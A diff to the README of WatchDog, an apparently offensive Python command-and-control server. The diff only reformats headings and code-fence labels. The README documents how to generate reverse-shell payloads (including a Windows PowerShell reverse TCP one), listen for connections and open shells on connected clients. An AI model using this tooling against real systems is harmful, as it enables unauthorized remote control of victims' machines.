@@ -1,14 +1,14 @@
 # WatchDog
 WatchDog is a simple Python-based command and control (C2) server that allows you to manage and interact with multiple clients remotely. It provides a basic shell interface for executing commands on connected clients, checking their status, and generating payload scripts for reverse shell connections.
 
-<h1>Features</h1>
+# Features
 Multi-client Support:      WatchDog can handle multiple client connections simultaneously.
 Payload Generation:        Generate payload scripts for various platforms and network configurations.
 Client Status Monitoring:  Keep track of connected clients and receive notifications when clients disconnect.
 Basic Shell Interface:     Interact with connected clients using a shell-like interface.
 
 # Installation
-```C
+```python
 git clone https://github.com/your-username/WatchDog.git
 cd WatchDog
 python WatchDog.py
@@ -19,13 +19,13 @@ WatchDog uses a simple command-line interface to manage various functionalities.
 
 generate
 Generate a payload for a reverse shell connection.
-```C
+```python
 generate payload=<payload_type> lhost=<local_host> lport=<local_port>
 ```
 
 server
 Configure the server settings and start listening for incoming connections.
-```C
+```python
 server rhost=<remote_host> rport=<remote_port> listening=<true/false>
 ```
 
@@ -40,22 +40,22 @@ Display help information with examples of command usage.
 
 # Example Usage
 Generate a payload for a Windows PowerShell reverse TCP connection:
-```C
+```python
 generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050
 ```
 
 Start the server and listen for incoming connections:
-```C
+```python
 server rhost=192.168.10.1 rport=5050 listening=true
 ```
 
 View the list of connected clients:
-```C
+```python
 sessions
 ```
 
 Interact with a specific client:
-```C
+```python
 shell 0
 ```
 
